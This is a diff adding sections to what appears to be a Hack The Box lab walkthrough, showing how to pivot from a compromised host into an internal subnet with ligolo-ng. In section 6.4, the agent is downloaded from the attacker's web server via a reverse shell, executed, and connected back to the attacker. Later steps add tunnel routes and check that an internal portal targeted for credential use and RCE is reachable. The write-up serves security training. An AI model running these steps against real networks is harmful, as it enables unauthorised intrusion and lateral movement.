@@ -845,6 +845,248 @@ Key findings:
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 6.2 Acquire and stage the ligolo-ng binaries:
+
+**Why this step:** Kali has no route to `10.13.37.0/24`; the portal is only reachable from the pivot. ligolo-ng builds an L3 tunnel so Kali's own tools and browser reach the internal net directly. It needs a `proxy` on Kali and an `agent` on the pivot.
+
+**Command:**
+
+```bash
+# On Kali:
+mkdir -p ~/ligolo && cd ~/ligolo
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
+tar xf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
+tar xf ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
+ls -l proxy agent
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`wget .../ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz`|The controller binary, run on Kali (x86-64). Note the version tag is `v0.9.2`, not `v0.92`; the wrong tag returns 404.|
+|`wget .../ligolo-ng_agent_0.9.2_linux_amd64.tar.gz`|The relay binary; `linux_amd64` matches the Ubuntu x86-64 target.|
+|`tar xf ...`|Extract each archive, yielding the `proxy` and `agent` executables.|
+
+**Result:**
+
+```
+-rwxr-xr-x 1 nedmoeca nedmoeca  7164088 Sep 26 04:04 agent
+-rwxr-xr-x 1 nedmoeca nedmoeca 21242040 Sep 26 04:07 proxy
+```
+
+**What this gives you:** Key finding: both ligolo-ng binaries staged on Kali, ready to deploy.
+
+**Next:** Start the proxy on Kali and create the TUN interface it will route through.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+
+#### 6.3 Start the ligolo proxy (as root) and create the TUN interface:
+
+**Why this step:** The proxy manages a virtual TUN interface and kernel routes, which requires `CAP_NET_ADMIN`. Running it as root is necessary; an unprivileged proxy cannot add the route and fails with "operation not permitted."
+
+**Command:**
+
+bash
+
+```bash
+# On Kali:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+cd ~/ligolo
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`ip tuntap add user $(whoami) mode tun ligolo`|Create a virtual TUN interface named `ligolo`; traffic routed to it is handed to the proxy process.|
+|`ip link set ligolo up`|Bring the interface up so routes can point at it.|
+|`sudo ./proxy`|Run the controller as root so it can create/destroy the interface and install routes.|
+|`-selfcert`|Auto-generate a self-signed TLS certificate for the agent-to-proxy tunnel.|
+|`-laddr 0.0.0.0:11601`|Listen on all interfaces, port 11601, for the agent's reverse connection.|
+
+**Result:**
+
+```
+INFO[0000] Listening on 0.0.0.0:11601
+         __    _             __
+        / /   (_)___ _____  / /___        ____  ____ _
+       Version: 0.9.2
+ligolo-ng »
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Proxy running as root and listening on 11601, at an interactive `ligolo-ng »` console.
+- Running it unprivileged earlier produced `Could not add route ... operation not permitted` and a non-functional tunnel; root resolves this.
+
+**Next:** Transfer the agent to the pivot and connect it back to this proxy.
+
+---
+
+#### 6.4 Deploy and connect the agent from the pivot:
+
+**Why this step:** The agent must run on airside-ws01 and connect outbound to the proxy on Kali. The outbound control connection rides eth0/VPN, which is allowed; only the data routes are kept off eth0.
+
+**Command:**
+
+bash
+
+```bash
+# On Kali (separate terminal): serve the agent
+cd ~/ligolo && python3 -m http.server 8000
+
+# On airside-ws01 (reverse shell):
+cd /tmp
+wget http://KALI_TUN0_IP:8000/agent -O agent
+chmod +x agent
+./agent -connect KALI_TUN0_IP:11601 -ignore-cert
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`python3 -m http.server 8000`|Temporary web server on Kali to deliver the agent binary.|
+|`wget .../agent -O agent`|Fetch the binary onto the pivot.|
+|`./agent -connect KALI_TUN0_IP:11601`|Connect the agent outbound to the proxy over Kali's tun0.|
+|`-ignore-cert`|Accept the proxy's self-signed certificate.|
+
+**Result:**
+
+```
+# pivot:
+WARN[0000] warning, certificate validation disabled
+INFO[0000] Connection established       addr="KALI_TUN0_IP:11601"
+
+# proxy console:
+INFO Agent joined.   id=020000000200 name=root@airside-ws01 remote="TARGET_IP:34454"
+```
+
+**What this gives you:** Key finding: agent connected; session `root@airside-ws01` available in the proxy. The agent auto-reconnects if the proxy restarts.
+
+**Next:** Select the session and autoroute the internal subnet.
+
+---
+
+#### 6.5 Autoroute the internal subnet and start the tunnel:
+
+**Why this step:** The agent is connected but no traffic flows until Kali has a route for the internal net pointing at the tunnel. Select only the internal `/24`; routing the external/VPN subnet back through the tunnel would loop the connection and drop it.
+
+**Command (ligolo-ng proxy console):**
+
+```
+session
+1
+autoroute
+# select ONLY 10.13.37.0/24 (space), then:
+#   Use an existing one -> ligolo -> Start the tunnel? Yes
+```
+
+Pre-step on Kali if the VPN pushed a competing route:
+
+bash
+
+```bash
+sudo ip route del 10.13.37.0/24     # remove the "via 10.10.14.1 dev tun0" route first
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`session` / `1`|Select the active agent session.|
+|`autoroute`|Read the agent's interfaces and offer their subnets as routes to install on Kali.|
+|select `10.13.37.0/24` only|Route just the internal net through the tunnel.|
+|leave `10.159.x.x` unselected|That is eth0/VPN; routing it through the tunnel creates a loop that kills the session.|
+|`ip route del 10.13.37.0/24`|The HTB VPN pushes `10.13.37.0/24 via 10.10.14.1 dev tun0`; delete it so the ligolo route wins.|
+
+**Result:**
+
+```
+INFO Creating routes for ligolo...
+? Start the tunnel? Yes
+INFO Starting tunnel to root@airside-ws01 (020000000200)
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Tunnel started with the internal `/24` routed through the `ligolo` interface.
+- The route-add succeeded only with the proxy running as root (the unprivileged attempt failed), and only after deleting the VPN-pushed `10.13.37.0/24` route.
+
+**Next:** Verify the route and prove reachability to the portal from Kali.
+
+---
+
+#### 6.6 Verify reachability and add the hostname:
+
+**Why this step:** Confirm the tunnel actually carries traffic before relying on it, and map the portal hostname so Craft's login and the exploit can address it by name.
+
+**Command:**
+
+bash
+
+```bash
+ip route | grep 10.13.37
+ping -c 2 10.13.37.10
+curl -s -I http://10.13.37.10/
+echo "10.13.37.10  portal.international.htb wifi.international.htb" | sudo tee -a /etc/hosts
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`ip route \| grep 10.13.37`|Confirm the route points at `dev ligolo`, not `via ... dev tun0`.|
+|`ping -c 2 10.13.37.10`|ICMP rides ligolo's L3 tunnel (a SOCKS proxy could not carry this), proving the pivot works.|
+|`curl -s -I http://10.13.37.10/`|Confirm the internal web server answers from Kali.|
+|`echo ... \| sudo tee -a /etc/hosts`|Resolve `portal.international.htb` to the internal IP locally (no internal DNS over the tunnel).|
+
+**Result:**
+
+```
+10.13.37.0/24 dev ligolo
+
+64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=351 ms
+64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=241 ms
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Content-Length: 14221
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Route confirmed `dev ligolo`; Kali reaches `10.13.37.10` by ICMP and HTTP through the tunnel (ttl 64, HTTP 200 from nginx).
+- Added latency (~295 ms vs 0.3 ms from the pivot directly) reflects the extra Kali-to-pivot round trip and is expected.
+- `portal.international.htb` now resolves locally on Kali to the internal portal.
+
+**Next:** From Kali, browse the Craft CMS admin login and authenticate as jenny using the sniffed credentials, then identify the exact Craft version to confirm the RCE applies.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
